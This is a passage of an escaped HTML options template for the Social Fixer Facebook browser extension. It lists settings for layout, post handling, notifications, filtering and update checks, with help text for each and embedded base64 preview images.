miss anything.</help>\n			<div class="desc">\n				%auto_click_older_posts% Auto-click "More Stories" %auto_click_more_times% times to get more posts\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>When friends or pages post multiple posts in a small amount of time, Facebook will show just the first one, with a link to &quot;show similar posts&quot;.\n\n		This option automatically clicks to expand these groupings of posts wherever they occur.</help>\n			<div class="desc">\n				%expand_similar_posts% Automatically expand "SHOW X SIMILAR POSTS" links\n			</div>\n		</div>\n		<div class="option tab_popular">\n			<help>Friends change their profile pictures often, and it can be difficult to tell who is who.\n\n		Select this option to revert to names instead of pictures.</help>\n			<div class="desc">\n				%chat_images_to_names% Change profile images in Chat conversation windows to friend names (not in left column)\n			</div>\n		</div>\n\n		<div class="option tab_popular">\n			<div class="desc">\n				%enable_on_apps% Enable Social Fixer to run when playing games or using apps on apps.facebook.com\n			</div>\n		</div>	\n\n		<!-- LAYOUT -->\n		\n		<div class="option tab_layout no_search" style="background-color:#3B5998;color:white;">Left Column</div>\n		<div class="option tab_layout">\n			<help>This makes the left column stay static on the screen so it doesn\'t scroll along with the page, giving you easy access to menu items</help>\n			%static_left_col% Lock the left column in place\n		</div>\n		\n		<div class="option tab_layout tab_layout">\n			<help>These links are added to the top left navigation area, under "News Feed", "Messages", etc</help>\n			Add quick links to left navigation: \n				%show_nav_all_connections% All Connections \n				%show_nav_unblock_applications% Unblock Applications \n		</div>\n		\n		<div class="option tab_layout">\n			<help>This expands your Messages to show you if there are any unread messages in your "Other" folder.</help>\n			%expand_nav_messages2% Expand "Messages" to show the "Other" folder unread count.\n		</div>\n\n		<div class="option tab_layout">\n			<help>Automatically expand the left navigation panel to show all available sections that are by default hidden behind the "More" link.</help>\n			%expand_left_nav% Show all available sections in the left navigation bar\n		</div>\n\n		<div class="option tab_layout">\n			<help>These are handy boxes that Social Fixer can add to help you quickly jump to your favorite pages, events, etc. You can click the box title to collapse/expand them, and you can even click "edit" on each box to choose which items you don\'t want to see listed.</help>\n			Add Quick-Link Boxes:\n				%show_my_pages% "My Pages"\n				%show_my_events% "My Events"\n				%show_my_groups% "My Groups"\n				%show_my_apps% "My Apps"\n		</div>\n		\n		<div class="option tab_layout no_search" style="background-color:#3B5998;color:white;text-align:center;">Center Column</div>\n		\n		<div class="option tab_layout">\n			<help>\n				The "control" panel is the box that appears at the top of feeds.<br>\n				This is convenient because it holds controls to mark the entire feed as read or muted in one click. The status line shows you a count of different actions performed by Social Fixer.\n				<br>\n				As you scroll down the page, the control panel can float down with you. This is useful because when you reach the bottom of the page, you can access the control panel to mark everything as read without having to scroll back to the top of the page.\n			</help>\n			%display_control_panel% Display the "<b>Control Panel</b>" at the top and %float_control_panel% Float it down the page as you scroll<br>\n			<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAAAzCAIAAADuLm1lAAAUxElEQVR42u1da3BUVZ4%2Fgh%2BCZaS7rJ08MCn7C0VkKw8cSLQy4MTdkQAjmEgeRHc%2BMIIzTM2IAcWVKstZVB7h4da4hrD54EAeoDjgYjKzOxMwRWkCA6FDUcDW1vRMgk2CZXVDLEnViu6599x73vf27Xu70%2Bne8%2Fvg3D7P3%2Fn9%2F%2Bd3T5%2B0zl3fffcdUFBQUFDILNylzF1BQUEh85D25h4e6L01v3pedry92kYK11Xkp5q9goKCQnLg3NyhH54YNp4LFjcKfjpxpfc0qITF%2BMHRsLB1V%2F8o%2Figb2Z5VQrwdFgR98c3sUKviFeodoqCgMPVwbO7EDzU7jpbwluXe2%2BNoLWGVKG9P5EFefS9QUFBINZyaO%2BPtyI7x8bR4RaMvSB%2B%2FATqB33cJN4A9tcNxpGB0dJQ%2BnAveLpx5qZO9VgAGuDH5bxNc%2B3wglhhr0YfSe02wZkyRwi%2By8EDMtUi0UlBQUEgReHOPRCI3bty4ffv2nTt3Hn74YbOYdlHT3gwD0w%2FPleA0d27nGmhOHwQrKivyaSvk7mSoKwzUvXCEuS0Rx8TndnSvUhLtwu3FEYipj%2FgWR%2Frxtw%2FI4tJ91cxBHo1rVjhaCxC0Mpz%2F3LlzqY6ygoJCZmLmzJmzZs3Kycnx%2BXxcFWPu165dg%2BZeUFBw77333n333aQVdRbV3bskEDpBTFk%2FubPeDhjXhqYNTVY8zYp3MswpG48q1JljkjsZzXULA6EgaS8vmW9%2BnyAvEsHbjeXOv4XKJxytRYA6vysoKCQb33zzzVdffQWt2%2B%2F3z5kzh64i5n7z5s2RkZGHHnoIvgq4%2Fry3V8ITsvQeQ3JuF0Yg4L2dfEZ%2Ba3luF3pbndItzu3CVwIO2vQgAMCcCq2B3Vrkf3%2Bwq1BQUFBIMKDFX758ubCwcPbs2biQmPvVq1elZ3vp72RIEblch0%2FQ9NEDuW83Pzk4t9NHZP5Knblv18asBKfJedrqdt3yvl0%2FjocC4n07JqJXZnPr59ciWDiZT%2F1KRkFBYeoQiUS%2B%2BOKLuXPn4hJi7kNDQ8XFxeKxXUFBQUFhmuPOnTsXL14sLS3FJcTcz507R%2F0FVUFBQUEhncB5uCNzb2trSzXtaYF169ZxJUoZhPRVJi2YpwXJDOafJIiyeIRLc084j7SDVASlDEhnZdKCeVqQzGD%2BSUIyFHBp7s88%2B2yq1UgxDh08KM1RpUz6KpMWzN2RfPfkzUg0Er0N8maBjU89mHb8Mx5SWTzCrbk3PZNqNVKMQx2H5DmqlElbZdKCebwk3zz%2Bt%2BVlgUAA5GZlwY%2BTk6Dv8ljf%2BdCvG0rSgv%2F%2FE0hl8QiX5t7U1JRIFtc%2Ffqlh52D5S907l%2Bc573Xh3SW%2F6gYNb3%2FyyGfGw89Knfd2MQ89fEdHhzRHYysjHc4TuVCcwnmmYKu8e2WmAFPM3JvQ3hPv%2BOCNqkfzQqGsvsvg%2FGWtZEERqCqaDOSB9r7QC08UJkxPxwtMWXokdt8huDMux7J4hEtzX7OGisTYxy%2FDFQIA17hjWR7S8bEXuvWCnctyHbBAI2j9l1s2N8YEDfs%2Beb6UKml4%2B1TFZ8bD86XMgKSzYybSmVuXaMPjeXV0dspzlFGGoo157Mg%2FxrP1AJ1bw75TPyvFaujDYs6rwkb6GaGxXpH1HPEo71AZNzlzofUxbXdqi3WqThKZUyG1Ti02KK6C6zbxANj%2B0cgvagJ9n2a194CaKrC2CsCz%2B9gk2Nqu%2BXvVAvgwtG99sT3nGKliu8CxHknuOeHf%2BtiSbq6FvTk4UtNZLNgNG2NeJ8blDFJZPMKtuTeuoVbY83LjzsFF5eVgycYdMM%2Fh572fgMHBM%2BUvde1wZu5oBC0LLLdJ62MvHNafcDNYtLEb1O87VTFgPBBzpwZEzzA%2FT7p0UzR1w14mKzq7OuU5SiuDGdI9pYUuAdfWsDOgD8UOK%2BVsvyL75TtV3qEybnLmQusPdZ9xHMdkMneWWt5i7T7xdFy8dndkMmv3UVAWAC1rQednoO88gJ5eUwaWb5tcWxXNmnX7R3%2F%2Fd%2FacY6SK7QK17Nw16Jo%2F6l6%2BuduZiThQ00ks6GYx4%2BvAuBxCKotHuDT3hsYGeoVbGlvOLNq0KdAyWtG3PrdnyzGwONSiFXVtXwb0WrPtos2d2%2FW9jLp0No6u2Qj2dhV0oY87lo23Vm2EG1J%2FzuWnqK8Hhw%2BjYWHdhf1a0%2Fq9fRUDxsPzJRwlfZDg%2Fh%2Fq1SfXa9Wol8FGbzAmYwhAsJU0hIDDr6ci3N3VLc1RWhk48JpdZ%2FCABhCBRYsWnTlzBpCVosYUB9Dz8pqWMzptvQspBKY4OvMAIobV0EVA5DXOgJTLVyQKQi8pXuWdKRMjZ8Z4zngqwt2UJVXMHaUWFRQhvuYuSELiQfz6yOebmgLtPVl9nwKfH1SVAXh%2Bj4LJmiLQsiGr9o0xf1Zk24ZA8%2B6Od3%2B5mhnLKpFKbRe46nN6LagW6Et2x1%2B6fSQaWsglKaQ2gl3Os8tnOMSyDjHotHouwuoRLs29vqGeCkLvK2u0dO9oHGkaqNgDXhyo6CjsatJ3wFvVlEP3bjELAeqCDK5uT2dhNx5h4xFQv%2BdP65m%2F9oz1vKL37PgVeBs9vKXvrMdR44qBx7lemNL26lz0jGr1Z0B1N4YSGY7vx2PChi8eBnV7GVKHuw9Lc5RRBjEkoado69zG8chAMt3Kz%2BGqoZG%2FVXZeW75WuzJM%2BBuyPLinT%2BfFzoXAjEypRFaUYy9I%2FMo7VMY%2BZ%2BTiB%2FdXvXgEZgta71iqmTtJrTnH7cQvoQZNbOIB8PMD4Y7moto3QOi6URKdnIQWv20tCIVA09YhkBX5S8eyR5t29777U2Ysq0TKsV2gnplIFsAq744%2FHUEjrEGZMiD%2BQnoTiZlDzcJ8lPZaMCSummgSk1IsWTzCrbnXs%2BluLKtsSLcj40EvguaO6s3WeiFARXWGhMYIutcbnZgo4wmMjqiNJpK22bWdgx5oc6em5OZh01arEhnmHydD4nmYYBy2yNF6LkdRb2o6iq18BWxp3Z6Owu6mkQfrjvy1sKNhpEkroVYDTLlYluQTMJ6ggYorghkrFcS98g6Vsc%2BZ8f2iRMyjdSiniLnD1DJnocWnI5W8xFvzm%2FDHrxY9vglEJjVbB7ejZQt8R5uzOvvGtraHItGI3wcMc%2F83wdxliSRPFSwjqpaJ7Hbj0CEUEjxol9V0bMWNoG0nm8zhRA%2Fa9rJetc0Gdx5Wj3Bp7nV1dUwQntl9dmHzIWLKpAhuWVwZbPuH5iP6I2C7oOZg4cKFZ8%2FC%2F6FH0vTVunEc6nb%2FcR3Qy%2BFT%2BaDxsK6Enx8eHrSRjUoJU5Y%2BZpj%2FERky2MYPD3HkyBFpjjLKcKmKpmkYfcYcLihdAZlPW2GouTmwu79A69YN6uC8AZNIUK8118KyZMfQnnaDZnFFT4YlgnhS3qEytjlTPU7WEpQ%2BAnkop5S5g9TCQtPi48JDBd3JS7y17dc7NhRt7Zj8sC9qlNSCV2ty%2FbWXwWQIZIGqIv87m8o2bG1v38b%2BJdYikeSpIq1m09r1xuEkZXgF7bKajq24EWjZLTPHJM1Fm%2B8leAc3fQxKsWTxCJfmvnr109QKf%2F%2FPz%2B45u%2FDFg28uzSVF%2F6Qt%2BuAbeR%2F9aNP70K9%2F%2B%2BZSgAu1R7oLHuGX4F%2FhA9Db4O9JbXgE1PbVZ%2BGeWt3yX%2BWD%2Fwgr6Id1xRJKwQNaLRpzHD3Dps9hYanxCcPSC9osaFLUYHXLf9LBeP%2F9D6Q5yijDJM0BkS0ZGRyQFJYY3IC2kNILGjf0rAuhDfhXIlTwAC2COPLBwsOSFQGJIECijGPlHSpjmzNGmPTacaLGcJsxmU41OA2Yx0ot%2B6CXDyY38a6M3ROZjP6iBR7eQwD4qhaABUX%2BlvbzqPad5oBvFnhkXo5lokoTyWqBT4axLOMy2i74o6jhINLEMKsnr0vkkhaSLYZiYZE5zPIlsWZ7UQ3GuYnYQjmlWGH1CJfmXltbSwdh60%2F2nl248b1t1EYlRcMHntj8gVaIDuZ6IWC7UM1RDQBP7%2FrDc%2Fq2Q92p0VFj2GAX2AxrYMPywSfQw3PFUkomA2YCBL3ohoRh7hjTDjDDQxw9elSao7QyeOXUXLlGqT4c9Qjo%2BThh6Ma4Svv4N0pzeiz6E8BP35OvaEwUJJcaMU7lnSkTK2fk4lOlesE0YB4jtfL%2FA88ii%2B9wkhIP4a1j%2F72ptqy9L6oZepZ%2FW1NgAzy5L%2B%2BBVWtr%2FLBq2zs9rz%2B%2FhOtlmUjSVMEL%2FHGYYU0tmQlyPPzF7jINpXLJCoHFZmMyx2rTCtOjmtIL4qrjoBQrrB7h1txrap2MnsE4%2BqFFjk6RMsMHlm7%2BACbIT4u9j5VZymQ487hItvb%2F79oqX9%2F56NG%2B0BA8voNI0UOBpkeyHgnMeqfn%2FCv15QmjNa571%2FdZI%2FfMPx7o7vnnp3f9nvZMaWFqIacklcUjXJp7Tc1TqdYoxfjww99Jc3SKlBn%2Fw9af7HtwZ%2B%2F08%2FZUK5PpzOMlueW9%2F1n2aO6jRXm5Pu0%2FPzAWnQyFQkc%2Fvbyl%2FgeJpKUn5J%2B%2F%2F8J7257IsW2YaJGH%2F33py%2BZJG75b%2FkWfXlqYWsSgJJXFI1ya%2B1OrVqVarBTjd8eOSXNUKZO%2ByqQFc3ckG3b%2B8fb163n%2BLJCV1frSj9OOf8ZDKotHuDT3lStXplqNFOP48ePSHFXKpK8yacE8LUhmMP8kQSqLR7g090gkkmo1Ugy%2F3y%2FNUaVM%2BiqTFszTgmQG808SpLJ4hBtzD4fDqZZiWiA%2Fn%2F%2B%2FvFbKIKSvMmnBPC1IZjD%2FJEGUxSPcmLuCgoKCwjSHMvf0xuuvvx6zzWuvvZZqmgoKLqEy3DWUuac3YOqfOnXKpsFv9m2fX5K4nzMrKEwtVIa7hjL39AZK%2FZMnT1o1uBQcVKmvkL5QGe4a6WTu4YG2kcJ1FYn6q0N4oPfW%2FOp52R45JJhVnLRtUv%2Buu7RoOkp9V1LEVMbLutzMFw%2BDqWY7lZhabjGVjFvqKcnwqd62zpG48MVj7hNXerv6R9FzweLGKU9tu3jAuhPD%2BlPxCrMJ1R5X07WshnB1p0GlUWB8mPN5b1e0hJ4yweaOeVF6MgMaDUg1R9sq9WHew38KqU9kQpOuCIROwAUWjmiD3nfJS77b6mDOa6wjZjhYnmzLhEQioWzZrSFSTSQEMrEyhOWWeHZezT3BGc6s2FqUeJIlXt9zPjQ1Mh7YYAokVfEiTnM37U9jxbreFMCJaLBN0Ae1mEApgzIZE6dWIERbZu6ipEk6uZuDhGnaMpV52jj10SnGiKKe90Bu7jKyaNSkmTuuQrJWgtOxwyHGJKGRSDBbmqgWw0iSzj58JounjxiJnXh4MvfEZ7g2YihgqE8%2BeDT3uHwvLnPnQ2MSTUTUXJq7sYD5t3pPh8Do6KhuRwAft8x3TZgp0TJRfxnp3kUfQQpHqONI9hW6GXWOKigY9ZcYu85KYiqIVCvT8uHr8NJ91aiENxOpuU8YzUQOQsnEFW51I6B4eJg6ANrTxvlAWtmEHhfQqQ%2F0XKfzHvA3kkLembbee8vn7%2B83YwDjSq1F44GjzFY5iw6ZFT3BcMcMhxgTNpm013cwUqCxojTnSsCEi1xyw5YNlfGJelkaPSZiMWTP5VLro8lo%2By9WhghpRBzPeCqJdolKclILyRwj%2F51JnfAMFwc0BNMyXLqRWdpMqptERd8TFMomgSs2hIIjrAAn7KMpo2ssP4XmbkhGHRxoMvjIQy%2BGNJjQErMEnMA2Q1sO16zSF6RmIK4ncUkjTDgqdCvuizYau5oZgPv2aqY11JpaiDGm5nBCCU27WntdAfZrg7W58%2B8VoxV1N2HwFmlzqY%2BB42h%2FLQM39mnD3MnJnQtBNbtaN9GhtaWPATbhsEh%2BQFunbnPZ1iX40J10thxR%2FFaQmLsdQ3pTAPlpgMnkCQcZwiW23g5ok5cEQkF97jDPCq%2BDCMsmM7vvJfnvUOqEZ7iYMHgJVhvZKtVtfI9EzayE70fmKtV8AcSIJgkN%2Ba5uLF%2BocgG3d%2B7cfQd3JpRlKuMrMJSa0tpo9Jled5suutlif39U9g6wgvQrFH8W074cCGZifXKnIydsW1LCrI7qE%2BsPJJY54IQ2fSPJnWjE1Lc9uRNzl0SKirL36BBtbMIhjQl9C0lfIllEBZ%2Bcks7W%2BcndliGzKWQZw6XECrzFHHOTZEKYZ0W%2BnglSixd40vx3KHXCM9z%2B5C7dyFapzgjI%2Bp7oddWmYoxcZseYl%2BYmbRDz2BAX3F7LCCX0e8nq5C7bwbT1ac%2BFgdAI1Uw6g%2F39BnUKIS6JCsn7WqRibe5UxIUXPrAYktk75JuW7NVtXYQHwVtOoM39uYm%2BlxRT36G585FiY3DJfXTwRnMQDiEm3FU4bTBWJTBwU8RWeudOrJykE%2B2o6AxosymA7KjLkMHvM%2BsMkdmDXhTw94d8xpUCywqboNVbCh7G7PPfqdSJz3B2EqxX2HIjW6W6jYCi15EfQ3DvENto8mGFsgrLpwwtbiTM3IFwKZpNv%2FKYy3TmPoo%2BrZvfGele%2BCY%2FxuWd0Yf%2FhQP3%2FdV48w6ACl5kuzv3CYFDWChhFyt%2BJc%2B2pc0vlpPCknacvwK2NXfj%2BxN9sW7ewEvPz46jgztxv%2FCwC4cYE%2B47vHZXYB660Lj01wrqT9JTwVb%2Baxnyq42CAhCoZK5RpAzpTUEcXHotY3FlH4sbbLh4caTf%2FCujft1CH18FJaUnd%2BqO2SL%2FHUrtgL%2BL37lLfjoXttrILG3JHzHkjm%2FlL9Q9BLl9t4wm92M5evmy39HFC0tzHxoaKikpmTFjhqthpzWm82%2BU46UNU%2F%2FpVUvtO07zf8UjvcLhiW2Sf1ztktu0%2Bcl3pma4l%2BW7xp07dy5evFhaWopLiLlfvXo1JyfH5%2FOleskJR3qZSbrTzrB1eWObXBt1y226mHt6ZcJ0X340Gr1x48bcuXNxCTH3mzdvXrt2bd68eTNnzkz1shUUFBQUnAIe269cufLAAw%2FMnj0bFzJ%2FrAiHw19%2B%2BWVBQUF2drayeAUFBYVpDmjrExMT8Fx%2B%2F%2F335%2BXl0VX8X6Lh2X58fPzrr7%2F%2B9ttvU01bQUFBQcEOM2bMuOeee6Q36ry5KygoKChkAJS5KygoKGQglLkrKCgoZCD%2BD6pepk4Qj4pKAAAAFHpUWHRWRVJTSU9OAAB42jPUswAAASoAmF0WeZwAAAAielRYdENSRUFUT1IAAHjaC3YOcnX1C%2FbwD4kPDgl18fQHAC55BTYNrY6nAAAAEXpUWHRHTk9URVMAAHjaUwAAACEAISXBVbAAAAARYkJJbgIAAAAAAAAAAPQBAAAzAAAAv4YH5QAAAQdiQlBuiVBORw0KGgoAAAANSUhEUgAAAfQAAAAzCAIAAADuLm1lAAAAzklEQVR42u3UQQkAMAzAwNa%2F6ZoYDMKdgryyA0DO%2Fg4A4D1zBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwgyd4AgcwcIMneAIHMHCDJ3gCBzBwg6i44ANO1Q2fEAAAAASUVORK5CYIJx4rZXAAAAAElFTkSuQmCC" style="width:295px;"><br>\n			\n		</div>\n	\n		<div class="option tab_layout">\n			%stretch_wide% <b>&lt;--- Stretch the layout</b> to full screen width ---&gt;\n		</div>\n\n		<div class="option tab_layout no_search" style="background-color:#3B5998;color:white;text-align:right;">Right Column</div>\n		\n		<div class="option tab_layout tab_popular">%hide_happening_now% Hide the "ticker" feed of friends\' activity</div>\n		<div class="option tab_layout">%hide_game_sidebar% Hide the Game icon sidebar</div>\n		<div class="option tab_layout">%hide_game_ticker% Hide friends\' real-time Game activity</div>\n		<div class="option tab_layout">%ticker_scroll% Scroll the ticker down with the page rather than keeping it static</div>\n		<div class="option tab_layout">%unlock_right_col% Unlock the right column so it scrolls with the page</div>\n		<div class="option tab_layout">\n			<div style="background-color:#f3f3f3;color:#333;padding:2px;">\n				<help>These are the boxes you have hidden from the right column by clicking the "X" in the title bar. To add them back to your page, click the "x" here to remove them from the "hidden" list.</help>\n				Hide these boxes (click the X to unhide):\n			</div>\n			<div class="bfb_sub_option">%right_panels_hidden_list%</div>\n		</div>\n\n		<div class="option tab_layout">\n			Add these boxes:\n			<div>\n				<help>Friend Tracker monitors your friend list and informs you when someone goes missing - usually a sign that they have unfriended you!</help>\n				%show_friend_tracker% Friend Tracker (Unfriend Notifier)\n				<div class="bfb_sub_option">Refresh every %friend_tracker_interval% hour(s)</div>\n			</div>\n			<div>\n				<help>Tips of the day will appear at most once every day or two, and will tell you about features or options you may not know about!</help>\n				%tips_of_the_day% Tips of the Day <button id="sfx_option_tips_reset">Reset</button>\n			</div>\n		</div>\n		\n		<!-- POSTS -->		\n\n		<div class="option tab_posts">\n			<help>These are the action icons to show in the upper right corner of posts when you hover over them.<br><br>If you want the icons to be invisible until you hover, check the "Hid euntil hover" box.<br>When you hover over a post, the icons are semi-transparent, which is the opacity. 0=invisible, 1=no transparency. (When you move your mouse over the icons themselves, they will be fully visible). The "zoom" setting makes the icons bigger, for those browsers that support it.</help>\n			%show_post_actions% Show <b>Post Action Icons</b> on each post. <br>\n			Post Action Icons: %hide_post_actions_until_hover% Hide until hover / Opacity=%post_action_opacity2% / Zoom=%post_action_zoom%%\n			<div>Show: \n				%show_post_action_info% Post Info\n				%show_post_action_google% Google It\n				%show_post_action_save% Save For Later\n				%show_post_action_info_add_app% Add App\n				%show_post_action_mark_unread% Mark Unread\n				%show_post_action_info_mute% Mute\n				%show_post_action_info_mark_read% Mark Read\n			</div>\n		</div>\n		<div class="option tab_posts">%fix_timestamps% Fix timestamps to show actual date/time ("one hour ago" becomes "12:34am (one hour ago)")</div>\n		<div class="option tab_posts">\n			<help>Sponsored stories appear in your news feed as regular stories, but they are Pages that your friends like, and the Pages pay to put them there.</help>\n			%hide_sponsored% Hide "Sponsored" stories from your news feed\n		</div>\n		<div class="option tab_posts">\n			<help>Sometimes Facebook will insert duplicate posts when retrieving more posts for the news feed. Social Fixer detects these duplicates and hides them. They will be shown as grayed out if you click "Toggle Hidden Posts"</help>\n			%hide_duplicates% Hide duplicate stories in the news feed\n		</div>\n		<div class="option tab_posts">\n			<help>Due to a bug in Facebook\'s code, some users don\'t see a cursor when they focus into a comment box to add a comment. This fix puts the cursor back again.</help>\n			%fix_comment_cursor% Fix the missing cursor problem in comment boxes\n		</div>\n		<div class="option tab_posts">\n			<help>Due to a bug in Facebook\'s code, when typing comments some users don\'t see text wrap to the next line until they type more characters past the end of the line. This makes it hard to see what you\'re typing on tne next line. This fixes that problem.</help>\n			%fix_comment_wrap% Fix the line wrap problem in comments as you type past the end of line\n		</div>\n		<div class="option tab_posts">\n			<help>Facebook has a feature built in that watches your page scroll and automatically loads new posts when you get near the bottom. This cause cause Facebook to slow down, and in particular when Social Fixer is running. By default, Social Fixer turns this feature off.</help>\n			%disable_scroll_load% Disable Facebook\'s auto-loading of more posts as you scroll down\n		</div>\n		<div class="option tab_posts">\n			<help>Posts by applications like games often have a link to claim a gift or item. With this option, you can force those links to open in a new tab, so you don\'t lose your place in the feed.<br><br>If you enable the second option, the post will also be marked as read and disappear from view, so you can concentrate on the unclaimed posts that are left.</help>\n			When clicking a link in an application post, %open_app_link_in_tab% open in a new browser tab/window and %open_app_link_marks_read% automatically mark the story as read\n		</div>\n		<div class="option tab_posts">\n			<help>Often after you comment on a post, you want it to disappear unless someone else posts a followup. This is also a great way to manage a Page if you are Admin. As you reply to user posts, they will disappear from the wall until your wall is empty and you\'re done!</help>\n			%mark_read_on_comment% Automatically mark a post as "read" after commenting on it\n		</div>\n		<div class="option tab_posts">%auto_expand_comments% Auto-expand collapsed comment threads on posts by Pages so all comments are visible</div>\n		<div class="option tab_posts">\n			<help>When someone posts multiple times in a row, Facebook groups those together under a "Similar Posts" link. When you expand this, all the posts are shown in a group. Instead, this option will re-order those inserted posts to the correct place in the feed timeline.</help>\n			%reorder% Put expanded "similar" posts in proper chronological order after expanding\n		</div>\n		<div class="option tab_posts">\n			<help>If you only want to mark posts as read on your news feed, and not on Pages or Profiles, you can disable that here. This will make the control panel go away at the top.</help>\n			%process_profiles% Process posts on Profiles and Pages, add control panel, and allow Mark As Read\n			<div>(But %dont_hide_posts_on_profiles% don\'t hide read posts on pages/profiles)</div>\n		</div>\n		<div class="option tab_posts">\n			<help>If you don\'t want to process posts on Groups, you can disable that here</help>\n			%process_groups% Process posts on Group Walls, add control panel, and allow Mark As Read\n		</div>\n		<div class="option tab_posts">%expand_see_more% Auto-expand "view more" links in posts and comments to show the full content</div>\n		<div class="option tab_posts">\n			<help>"Read" posts re-appear if new comments are made. You can turn that feature off entirely, or set a threshold for a number of posts to trigger it to be turned off. This is useful on posts by Pages, for example. If a post gets more than 100 comments, for example, you can automatically make it stop re-appearing in your news feed.</help>\n			Hide new notification of comments (%auto_mute_all% always) or when there are more than %auto_mute_count% comments\n		</div>\n		<div class="option tab_posts">%undo_ctrl_z% Map Ctrl+z to "undo"</div>\n		<div class="option tab_posts">\n			<help>When you click links to external sites from within Facebook, it first sends you through a redirection service that checks for malicious links and logs the site you are going to, then redirects you there. You should not check this unless you are sure of what you\'re doing.</help>\n			%prevent_link_redirection% Prevent external link redirection\n		</div>\n		<div class="option tab_posts">\n			<help>When stories like "Friend read a story on Yahoo News" appear, the link takes you to the Social News app, not the actual story url. This fix redirects the links to the actual story url.</help>\n			%fix_social_news_links% Fix "Social News" links to open directly to the story URL\n		</div>\n		\n		<!-- DISPLAY -->\n		\n		<div class="option tab_display">\n			<help>Many users have wider screens and find it convenient to always have their notifications list handy. This option puts the Notifications list on the right side of the screen on every page, for quick access. You don\'t have to click the Notifications icon to view the list.</help>\n			<b>Pin the notifications</b> panel to the %pin_notifications_right_panel% right sidebar or the %pin_notifications% far right\n		</div>\n		<div class="option tab_display">\n			<help>When you move your mouse over Notification items, this option will show you a popup view of the post or picture referenced in the notification so you don\'t need to click the notification to navigate to the page.</help>\n			%show_notification_previews2% Show previews when hovering over notification list items\n		</div>\n		<div class="option tab_display">%tab_count% Show post count in tabs</div>\n		<div class="option tab_display">%left_align% Left align the page rather than center</div>\n\n		<div class="option tab_display">%reload_when_mark_all_read% Reload automatically when Mark All Read is clicked</div>\n		<div class="option tab_display">\n			<help>This notification box only shows up for some users</help>\n			%hide_update_email% Hide the "Please update your email address" box that appears repeatedly\n		</div>\n		<div class="option tab_display">%hide_notification_pictures% Hide profile pictures in the notification list</div>\n		<div class="option tab_display">\n			<help>By default, Facebook will show you a preview of a person or Page\'s profile when you hover over their name. You can disable that.</help>\n			%hide_hovercard% Hide information popup when hovering over user name links\n		</div>\n		\n		<!-- ADVANCED -->\n		<div class="option tab_advanced"><b>These options give you complete control over lots of settings! Tweak it all you want!</b></div>\n		<div class="option tab_advanced">%auto_subscribe_news% Auto-subscribe and favorite the "Social Fixer News" list</div>\n		<div class="option tab_advanced">%console_logging_enabled% Enable console debug logging</div>\n		<div class="option tab_advanced">"Older Posts" selector:%older_posts_selector%</div>\n		<div class="option tab_advanced">Notification preview Image max-width:%preview_img_max_width2% max-height:%preview_img_max_height2%</div>\n		<div class="option tab_advanced">%show_options_save_message% Show "Refresh the page" alert after saving Options</div>\n		<div class="option tab_advanced">Clean out data for individual posts after %comment_expire_days% days (per post) to save space in preferences</div>\n		<div class="option tab_advanced">%show_version_changes% Show changes after installing a new version</div>\n<!-- -->\n		<div class="option tab_advanced">%check_for_updates2% Check for updates to Social Fixer every %update_check_interval2% hours <button id="sfx_option_check_update_reset">Reset</button>\n			<!--<div>%check_for_beta_updates% Also check for BETA updates</div>-->\n		</div>\n<!-- -->\n		<div class="option tab_advanced">%check_for_messages2% Check for important Social Fixer messages every %message_check_interval2% minutes <button id="sfx_option_check_messages_reset">Reset</button></div>\n		<div class="option tab_advanced">%allow_bfb_formatting% Allow posts by Social Fixer to retain html formatting</div>\n		<div class="option tab_advanced">Pause for %expand_similar_posts_delay%ms between clicks when expanding "Similar Posts" links</div>\n		<div class="option tab_advanced">Wait for %image_preview_delay% seconds before showing thumbnail previews on hover</div>\n		<div class="option tab_advanced">When Notifications are pinned to the right side, force it to be %pin_notifications_width% wide (ex:200px)</div>\n		<div class="option tab_advanced">Floating control panel opacity: %floating_cp_opacity% / Manual offset: %floating_cp_offset%px</div>\n		<div class="option tab_advanced">\n			<help>\n				When you click the Facebook logo in the upper left or any "Home" navigation item to return to your home page, Facebook actually uses an internal navigation mechanism that confuses Social Fixer and sometimes causes features to malfunction.\n				 <br><br>\n				 Enabling this option fixes this problem by redirecting you to the proper home page url when clicking these links.\n			</help>\n			</span>\n			%fix_logo2% Fix navigation on the upper left logo and "News Feed" links to go to %home_url%\n		</div>\n		<div class="option tab_advanced">%pagelet_toggle% Enable collapse/expand of boxes in right panel by clicking their headers</div>\n		<div class="option tab_advanced">Hide right column panels:<br>%right_panels_hidden%</div>\n		<div class="option tab_advanced">Hide these page sections:<br>%hidden_elements%</div>\n		<div class="option tab_advanced">Hide the "x" option from these page sections:<br>%hidden_elements_x%</div>\n		<div class="option tab_advanced">My Pages: %my_pages_new_window% Open in a new window | %my_pages_max_height%px high in position %my_pages_position%</div> \n		<div class="option tab_advanced">My Events %my_events_new_window% Open in a new window | %my_events_max_height%px high in position %my_events_position%</div> \n		<div class="option tab_advanced">My Groups: %my_groups_new_window% Open in a new window | %my_groups_max_height%px high in position %my_groups_position%</div> \n		<div class="option tab_advanced">My Apps: %my_apps_new_window% Open in a new window | %my_apps_max_height%px high in position %my_apps_position%</div>\n		<div class="option tab_advanced">%show_friend_tracker_no_activity_msg% Show Friend Tracker message when there is no activity</div>\n		<div class="option tab_advanced">%friend_tracker_show_note% Show the Learn More note when Friend Tracker finds an unfriend</div>\n		<div class="option tab_advanced">Show unfriends in Friend Tracker for %friend_tracker_duration% days</div>\n		<div class="option tab_advanced">Show control panel buttons: %cp_button_mark_all_read%Mark All Read\n														%cp_button_show_hide_all%Toggle Hidden Posts\n														%cp_button_mute_all%Mute All\n														%cp_button_reload%Reload\n														%cp_button_undo%Undo\n		</div>\n		<div class="option tab_advanced">%highlight_sfx_news% Highlight the Social Fixer News "unread message count" counter in red</div>\n		\n		<!-- FILTERING -->\n		<div class="option tab_filtering">\n			<help>Disabling filters entirely lets you debug problems or temporarily switch to an unfiltered view</help>\n			%filters_enabled% Enable Filters\n		</div>\n		<div class="option tab_filtering">\n			<help>If you have defined tabs in filter rules, they will only be created if there are actually posts to move there. This is to conserve space. If you would rather have all your tabs created - every time - then enable this.</help>\n			%always_show_tabs% Always show all defined tabs (even if no posts are moved there)\n		</div>\n		<div class="option tab_filtering">\n			